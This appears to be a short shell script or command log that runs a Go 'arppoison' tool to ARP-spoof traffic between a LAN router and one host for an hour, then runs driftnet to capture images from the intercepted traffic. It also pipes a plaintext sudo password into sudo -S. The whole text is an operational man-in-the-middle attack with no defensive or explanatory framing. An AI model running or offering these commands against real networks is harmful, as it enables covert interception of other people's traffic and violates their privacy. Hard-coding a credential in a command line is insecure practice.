cd /home/arcoon/dev/go/repo/src/github.com/nkbai/arppoison
echo "8008080"|sudo -S ./arppoison -ip1 192.168.0.1 -ip2 192.168.0.101 -t 3600 -d

sudo driftnet -i eth0
